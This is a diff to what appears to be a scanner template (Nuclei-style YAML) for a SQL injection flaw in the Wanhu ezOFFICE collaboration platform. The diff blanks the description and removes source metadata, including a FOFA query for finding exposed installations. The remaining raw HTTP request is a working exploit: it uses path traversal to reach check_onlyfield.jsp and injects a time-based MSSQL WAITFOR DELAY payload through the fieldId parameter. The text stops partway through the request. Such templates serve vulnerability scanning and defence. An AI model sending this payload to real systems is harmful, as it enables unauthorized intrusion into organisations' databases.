@@ -3,12 +3,8 @@ info:
   name: 万户 ezOFFICE check_onlyfield.jsp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zqxkv768m5wkxaq0'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zqxkv768m5wkxaq0
-    fofa: app="ezOFFICE协同管理平台"
 http:
 - raw:
   - 'GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
